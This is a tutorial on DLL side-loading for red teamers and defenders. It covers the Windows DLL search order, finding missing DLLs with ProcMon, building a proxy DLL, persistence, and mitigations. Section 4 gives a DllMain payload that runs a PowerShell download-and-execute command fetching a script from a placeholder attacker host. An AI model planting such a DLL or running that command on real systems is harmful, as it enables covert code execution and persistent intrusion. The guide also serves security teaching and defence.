# Comprehensive Guide to DLL Side-Loading for Red Teamers and Security Professionals

## 1. Introduction to DLL Side-Loading

Dynamic-Link Library (DLL) side-loading is a common cyber-attack technique used to achieve persistence, escalate privileges, and evade detection. This method involves tricking a legitimate and often signed application into loading a malicious DLL file instead of the intended one. Because the application itself is trusted, security solutions may not flag its behavior, allowing the malicious code to execute under the radar.

This guide provides a deep dive into the mechanics of DLL side-loading, from discovery and exploitation to defensive and mitigative strategies.

## 2. How DLL Side-Loading Works

Windows applications often load DLLs at runtime to perform various functions. The operating system follows a specific search order to locate these DLLs. An attacker can exploit this search order by placing a malicious DLL with the same name as a legitimate one in a location that the application searches before the legitimate DLL's actual path.

The standard DLL search order is as follows:
1.  The directory from which the application is loaded.
2.  The system directory (`C:\Windows\System32`).
3.  The 16-bit system directory (`C:\Windows\System`).
4.  The Windows directory (`C:\Windows`).
5.  The current working directory.
6.  The directories listed in the `PATH` environment variable.

Attackers typically target the first step, placing a malicious DLL in the application's directory.

## 3. Finding Vulnerable Applications

The first step in a DLL side-loading attack is to identify an application that is vulnerable.

### Tools for Discovery:
*   **Process Monitor (ProcMon):** A powerful tool from Sysinternals that can monitor file system, registry, and process/thread activity. You can use it to identify `NAME NOT FOUND` errors for DLLs, which indicates an application is searching for a DLL that doesn't exist in a particular location.
*   **Robber:** A tool specifically designed to find DLL side-loading opportunities.
*   **Manual Analysis:** Running an application and observing its behavior, or reverse-engineering it to understand its DLL-loading mechanisms.

### Steps to Find a Vulnerable Application using ProcMon:
1.  **Start ProcMon:** Launch `procmon.exe`.
2.  **Set Filters:**
    *   `Process Name` is `<your_target_application.exe>`
    *   `Path` ends with `.dll`
    *   `Result` is `NAME NOT FOUND`
3.  **Launch the Target Application:** Start the application you want to test.
4.  **Analyze Results:** Look for `CreateFile` operations on DLLs that result in `NAME NOT FOUND`. This shows the application tried to load a DLL from a specific path and failed.

## 4. Crafting the Malicious DLL

Once you've identified a vulnerable application and the name of the missing DLL, you need to create a malicious DLL that the application will load.

### Key Requirements:
*   **Matching Architecture:** The malicious DLL must match the architecture (32-bit or 64-bit) of the target application.
*   **Exported Functions:** The DLL must export the same functions that the legitimate application expects to import from it. If it doesn't, the application will likely crash upon loading the DLL.

### Steps to Create the Malicious DLL:
1.  **Identify Required Exports:** Use a tool like `dumpbin` (from Visual Studio) or a PE viewer to inspect the legitimate DLL (if it exists elsewhere) and list its exported functions.
2.  **Create a Proxy DLL:**
    *   Write a simple DLL project in C/C++.
    *   Implement the required exported functions. You can either forward these calls to the real DLL (a technique called "proxying") or simply leave them as empty stubs if they aren't critical for the application to run.
    *   Add your malicious payload to the `DllMain` function. This function is executed when the DLL is loaded or unloaded.

### Example `DllMain` with a Payload:
```cpp
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // Your malicious code here
        // Example: spawn a reverse shell
        system("cmd.exe /c \"powershell -c 'IEX(New-Object Net.WebClient).DownloadString(\\\"http://<ATTACKER_IP>/shell.ps1\\\")'\"");
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

## 5. Execution and Persistence

### Execution:
To execute the attack, simply place your malicious DLL in the same directory as the vulnerable application's executable. When a user runs the application, it will load your DLL, and your payload will be executed with the same permissions as the application.

### Persistence:
If the vulnerable application is one that runs at startup (e.g., a driver update utility, a software updater), you can achieve persistence. Every time the system reboots, the application will start and load your malicious DLL.

## 6. Defensive and Mitigation Strategies

### For Developers:
*   **Use Absolute Paths:** When loading DLLs, use absolute paths to ensure the application loads the correct one.
*   **Code Signing:** Sign your DLLs and configure the application to verify the signature before loading.
*   **Manifests:** Use application manifests to specify exact versions of DLLs.

### For System Administrators and Blue Teams:
*   **Application Whitelisting:** Use tools like AppLocker to control which applications and DLLs are allowed to run.
*   **Endpoint Detection and Response (EDR):** Modern EDR solutions can often detect suspicious parent-child process relationships (e.g., `winword.exe` spawning `powershell.exe`) and anomalous DLL loads.
*   **Monitoring:** Monitor for `.dll` files being written to application directories. Pay close attention to newly created files in directories of commonly abused software.

## 7. Conclusion

DLL side-loading remains a potent technique in an attacker's arsenal. Understanding how it works is the first step toward defending against it. By combining secure coding practices, robust system administration, and vigilant monitoring, organizations can significantly reduce their risk of falling victim to this type of attack.
